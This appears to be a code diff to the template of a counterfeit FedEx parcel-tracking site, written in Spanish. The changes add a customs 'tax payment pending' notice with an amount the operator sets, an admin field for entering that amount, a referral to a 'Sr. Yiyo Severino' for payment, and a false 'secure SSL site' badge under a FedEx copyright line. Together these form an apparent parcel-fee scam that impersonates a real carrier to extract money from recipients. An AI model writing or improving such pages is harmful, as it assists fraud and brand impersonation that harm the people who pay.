@@ -183,6 +183,19 @@
       letter-spacing: 0.5px;
       border: none;
     }
+    .footer-seguro {
+      font-size: 0.85em;
+      color: #333;
+      margin-top: 8px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+    .icon-candado {
+      font-size: 1.2em;
+      margin-right: 6px;
+    }
     @media (max-width: 600px) {
       .main-title { font-size: 1.3em; }
       .fedex-bg-title { font-size: 12vw; top: 26vh;}
@@ -213,18 +226,33 @@
   {% if datos %}
   <div class="resultado">
     <h3>Información del Paquete</h3>
+    <div style="font-size:1.15em; color:#4d148c; font-weight:bold; margin-bottom:18px;">Hola, {{ datos.nombre }}, este es el estado de tu envío.</div>
+    <div class="dato-row"><span class="dato-label">Destinatario:</span> <span class="dato-valor">{{ datos.nombre }}</span></div>
+    <div class="dato-row"><span class="dato-label">Remitente:</span> <span class="dato-valor">{{ info_paquete.enviado_por }}</span></div>
     <div class="dato-row"><span class="dato-label">Número:</span> <span class="dato-valor">{{ datos.numero }}</span></div>
-    <div class="dato-row"><span class="dato-label">Nombre:</span> <span class="dato-valor">{{ datos.nombre }}</span></div>
-    <div class="dato-row">
-      <span class="estado-label">Estado:</span>
-      <span class="estado-valor"
-        style="color:{% if datos.estado == 'Retenido' %}#e74c3c{% elif datos.estado == 'En tránsito' %}#4d148c{% elif datos.estado == 'Entregado' %}#27ae60{% elif datos.estado == 'En espera de pago de impuesto' %}#FF6600{% else %}#222{% endif %};">
-        {{ datos.estado }}
-      </span>
-    </div>
-    {% if datos.estado == 'En espera de pago de impuesto' %}
+    {% set estado = datos.estado|lower|trim %}
+    {% if estado == 'retenido' %}
+      {% set color_estado = '#e74c3c' %}
+    {% elif estado == 'en tránsito' or estado == 'en transito' %}
+      {% set color_estado = '#4d148c' %}
+    {% elif estado == 'entregado' %}
+      {% set color_estado = '#27ae60' %}
+    {% elif estado == 'en espera de pago de impuesto' %}
+      {% set color_estado = '#FF6600' %}
+    {% else %}
+      {% set color_estado = '#222' %}
+    {% endif %}
+    <div class="dato-row"><span class="dato-label">Estado:</span> <span class="estado-valor" style="color:{{ color_estado }};">{{ datos.estado }}</span></div>
+    {% if datos.estado|lower|trim == 'en espera de pago de impuesto' %}
       <div style="background:#fff7e6; border:1.5px solid #FF6600; border-radius:7px; padding:13px 14px 10px 14px; margin-bottom:16px; color:#FF6600; font-weight:bold;">
-        Tu paquete está pendiente de pago de impuesto aduanal. Por favor, realiza el pago para continuar con el proceso de entrega.
+        <p>Su paquete se encuentra actualmente <b>en espera del pago de los gastos legales y de legalización aduanal</b>. Para evitar que el envío sea retenido o demorado por las autoridades, es necesario abonar el monto correspondiente a los impuestos y legalizaciones requeridas por la normativa internacional.</p>
+        <p>Por favor, realice el pago lo antes posible para continuar con el proceso de entrega y evitar inconvenientes adicionales.</p>
+        <p style="margin-top:10px; font-size:1.25em; font-weight:bold;">
+          <span style="color:#4d148c;">Monto a pagar:</span> <span style="color:#27ae60; text-shadow: 0 1px 2px #b2f2c9; font-size:1.3em;">${{ datos.impuesto if datos.impuesto else '---' }} USD</span>
+        </p>
+        <p style="margin-top:12px; color:#4d148c; font-weight:normal; font-size:1em;">
+          Para recibir orientación personalizada sobre el proceso de pago y legalización, le recomendamos <b>contactarse directamente con el Sr. Yiyo Severino</b>, quien le guiará profesionalmente en cada paso y resolverá cualquier inquietud relacionada con su envío.
+        </p>
       </div>
     {% endif %}
     <div class="dato-row"><span class="dato-label">Última Actualización:</span> <span class="dato-valor">{{ datos.ultima_actualizacion }}</span></div>
@@ -238,12 +266,15 @@
           <div class="dato-row"><input type="text" name="numero_nuevo" placeholder="Número de rastreo" required style="width:100%;"></div>
           <div class="dato-row"><input type="text" name="nombre_nuevo" placeholder="Nombre destinatario" required style="width:100%;"></div>
           <div class="dato-row">
-            <select name="estado_nuevo" required style="width:100%;">
+            <select name="estado_nuevo" id="estado_nuevo" required style="width:100%;">
               <option value="En tránsito">En tránsito</option>
               <option value="Retenido">Retenido</option>
               <option value="Entregado">Entregado</option>
               <option value="En espera de pago de impuesto">En espera de pago de impuesto</option>
             </select>
+          </div>
+          <div class="dato-row" id="impuesto_row" style="display:none;">
+            <input type="number" min="0" step="0.01" name="impuesto_nuevo" id="impuesto_nuevo" placeholder="Monto de impuesto en USD" style="width:100%;">
           </div>
           <div class="dato-row">
             <select name="pais_origen_nuevo" required style="width:100%;">
@@ -308,9 +339,24 @@
           <button type="submit" style="width:100%; background:#4d148c; color:#fff; border:none; border-radius:7px; padding:13px 0; font-size:1.1em; font-weight:bold; margin-top:10px;">Guardar</button>
         </form>
       </div>
+      <script>
+        const estadoSelect = document.getElementById('estado_nuevo');
+        const impuestoRow = document.getElementById('impuesto_row');
+        estadoSelect.addEventListener('change', function() {
+          if (this.value === 'En espera de pago de impuesto') {
+            impuestoRow.style.display = '';
+          } else {
+            impuestoRow.style.display = 'none';
+            document.getElementById('impuesto_nuevo').value = '';
+          }
+        });
+      </script>
       {% endif %}
   <div class="pie">
     © Todos los derechos reservados por FedEx | Normativas internacionales
+    <div class="footer-seguro">
+      <span class="icon-candado">&#128274;</span> Sitio seguro. Tus datos están protegidos con cifrado SSL.
+    </div>
   </div>
 </body>
 </html>
